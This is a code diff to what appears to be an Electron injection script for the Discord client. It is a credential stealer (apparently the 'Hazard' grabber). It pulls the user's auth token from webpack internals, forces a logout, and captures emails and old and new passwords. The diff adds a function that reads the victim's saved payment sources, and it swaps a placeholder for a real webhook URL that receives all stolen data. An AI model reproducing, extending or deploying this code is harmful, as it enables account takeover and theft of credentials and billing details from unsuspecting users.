@@ -3,7 +3,7 @@ const path = require('path');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "https://ptb.discord.com/api/webhooks/940891156701663254/JXGahwh0ebKrmW2wP1dcBEm5-U1jNcRqhJ6SY4Va6QI0UvkrTLgOrdMCJo9Re-Scck5F";
 
 function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "Hazard"))) {
@@ -13,6 +13,95 @@ function FirstTime() {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     return !1
+
+}
+function GetNitro(flags) {
+    if (flags == 0) {
+        return "No Nitro"
+    }
+    if (flags == 1) {
+        return " <a:classic:940587229443674142>   \`Nitro Classic\`"
+    }
+    if (flags == 2) {
+        return "<a:nitrobooster:940587164385824768> \`Nitro Boost\`"
+    } else {
+        return "No Nitro"
+    }
+}
+function GetBadges(flags) {
+    const Discord_Employee = 1;
+    const Partnered_Server_Owner = 2;
+    const HypeSquad_Events = 4;
+    const Bug_Hunter_Level_1 = 8;
+    const House_Bravery = 64;
+    const House_Brilliance = 128;
+    const House_Balance = 256;
+    const Early_Supporter = 512;
+    const Bug_Hunter_Level_2 = 16384;
+    const Early_Verified_Bot_Developer = 131072;
+    var badges = "";
+    if ((flags & Discord_Employee) == Discord_Employee) {
+        badges += "<a:dcstaff:940586479971860510> "
+    }
+    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
+        badges += "<:dcpartner:940586351659724810>"
+    }
+    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
+        badges += "<:dchypeevents:940586822088671282> "
+    }
+    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
+        badges += "<:dcnormalbughunter:940586637279248395>"
+    }
+    if ((flags & House_Bravery) == House_Bravery) {
+        badges += "<:dcbravery:940586879307366460>"
+    }
+    if ((flags & House_Brilliance) == House_Brilliance) {
+        badges += "<:dcbrilliance:940586946529472572>"
+    }
+    if ((flags & House_Balance) == House_Balance) {
+        badges += "<:dcbalance:940587001428705291>"
+    }
+    if ((flags & Early_Supporter) == Early_Supporter) {
+        badges += "<a:dcearly:940586245292171275>"
+    }
+    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
+        badges += "<:dcshinybughunter:940586543318446091>"
+    }
+    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
+        badges += "<:dcdev:940586119840550992>"
+    }
+    if (badges == "") {
+        badges = "None"
+    }
+    return badges
+}
+
+function PM(token) {
+    const window = BrowserWindow.getAllWindows()[0];
+window.webContents.executeJavaScript(`
+var xmlHttp = new XMLHttpRequest();
+xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+xmlHttp.setRequestHeader("Authorization", "${token}");
+xmlHttp.send( null );
+xmlHttp.responseText`, !0).then((pm) => {
+    var billing = "";
+    pm.forEach(z => {
+        if (z.type == "") {
+            return "\`❌\`"
+        } else if (z.type == 2 && z.invalid != !0) {
+            billing += "\`✔️\`" + " :paypal:"
+        } else if (z.type == 1 && z.invalid != !0) {
+            billing += "\`✔️\`" + " 💳"
+        } else {
+            return "\`❌\`"
+        }
+    })
+    if (billing == "") {
+        billing = "\`❌\`"
+    }
+    return billing
+
+})
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -68,67 +157,6 @@ function SendToWebhook(info) {
     `, !0)
 }
 
-function GetNitro(type) {
-	if (type == 0) {
-		return "No Nitro"
-	}
-	if (type == 1) {
-		return "\`Nitro Classic\`"
-	}
-	if (type == 2) {
-		return "\`Nitro Boost\`"
-	} else {
-		return "No Nitro"
-	}
-}
-
-function GetBadges(flags) {
-	const Discord_Employee = 1;
-	const Partnered_Server_Owner = 2;
-	const HypeSquad_Events = 4;
-	const Bug_Hunter_Level_1 = 8;
-	const House_Bravery = 64;
-	const House_Brilliance = 128;
-	const House_Balance = 256;
-	const Early_Supporter = 512;
-	const Bug_Hunter_Level_2 = 16384;
-	const Early_Verified_Bot_Developer = 131072;
-	var badges = "";
-	if ((flags & Discord_Employee) == Discord_Employee) {
-		badges += "Discord Staff, "
-	}
-	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
-		badges += "Partnered Server Owner, "
-	}
-	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
-		badges += "Hypesquad Event, "
-	}
-	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
-		badges += "Green Bughunter, "
-	}
-	if ((flags & House_Bravery) == House_Bravery) {
-		badges += "Hypesquad Bravery, "
-	}
-	if ((flags & House_Brilliance) == House_Brilliance) {
-		badges += "HypeSquad Brillance, "
-	}
-	if ((flags & House_Balance) == House_Balance) {
-		badges += "HypeSquad Balance, "
-	}
-	if ((flags & Early_Supporter) == Early_Supporter) {
-		badges += "Early Supporter, "
-	}
-	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
-		badges += "Gold BugHunter, "
-	}
-	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
-		badges += "Discord Developer, "
-	}
-	if (badges == "") {
-		badges = "None"
-	}
-	return badges
-}
 
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -364,6 +392,12 @@ xmlHttp.responseText;`, !0).then((info) => {
                         "value": `\`${GetNitro(json.premium_type)}\``,
                         "inline": false
 },
+{
+    "name": " <a:nitro:942395826544705626> **Billing:**",
+                            "value": `\`${PM(token)}\``,
+                            "inline": false
+    },
+
 
                 ],
                 "author": {
@@ -417,7 +451,7 @@ xmlHttp.responseText;`, !0).then((info) => {
                     },
                     {
                         "name": "**<a:pass:942396025228902430>New  Password**",
-                        "value": `\`${data.password}\``,
+                        "value": `\`${data.new_password}\``,
                         "inline": false
                     },
 {
@@ -430,6 +464,11 @@ xmlHttp.responseText;`, !0).then((info) => {
                         "value": `\`${GetNitro(json.premium_type)}\``,
                         "inline": false
 },
+{
+    "name": " <a:nitro:942395826544705626> **Billing:**",
+                            "value": `\`${PM(token)}\``,
+                            "inline": false
+    },
 
                 ],
                 "author": {
@@ -483,15 +522,20 @@ xmlHttp.responseText;`, !0).then((info) => {
                         "inline": false
                     },
 {
-"name": "<a:badges:942395694134751323> **Badges**",
+"name": "<a:badges:942395694134751323> **Badges:**",
                         "value": `\`${GetBadges(json.flags)}\``,
                         "inline": false
 },
 {
-"name": " <a:nitro:942395826544705626> **Nitro Type**",
+"name": " <a:nitro:942395826544705626> **Nitro Type:**",
                         "value": `\`${GetNitro(json.premium_type)}\``,
                         "inline": false
 },
+{
+    "name": " <a:nitro:942395826544705626> **Billing:**",
+                            "value": `\`${PM(token)}\``,
+                            "inline": false
+    },
 
                 ],
                 "author": {
